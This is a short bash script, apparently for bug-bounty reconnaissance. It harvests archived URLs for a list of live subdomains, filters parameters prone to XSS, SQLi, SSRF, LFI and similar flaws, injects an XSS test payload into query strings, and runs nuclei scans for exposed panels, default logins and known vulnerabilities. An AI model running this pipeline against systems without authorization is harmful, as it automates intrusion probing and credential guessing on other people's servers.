#!/bin/bash

cat final_subdomain_live.txt | waybackurls | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'

cat final_subdomain_live.txt | gau --fc 200 | urldedupe -s -qs | gf lfi redirect sqli-error sqli ssrf ssti xss xxe | qsreplace FUZZ | grep FUZZ | nuclei -silent -t ~/nuclei-templates/dast/vulnerabilities -dast

cat final_subdomain_live.txt | gau --fc 200 | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'

cat final_subdomain_live.txt | nuclei -t ~/nuclei-templates/http/exposed-panels

cat final_subdomain_live.txt | nuclei -t ~/nuclei-templates/http/exposures

cat final_subdomain_live.txt | nuclei -t ~/nuclei-templates/http/default-logins

cat final_subdomain_live.txt | nuclei -t ~/nuclei-templates/http/vulnerabilities/wordpress

cat final_subdomain_live.txt | nuclei -t ~/nuclei-templates/http/vulnerabilities/
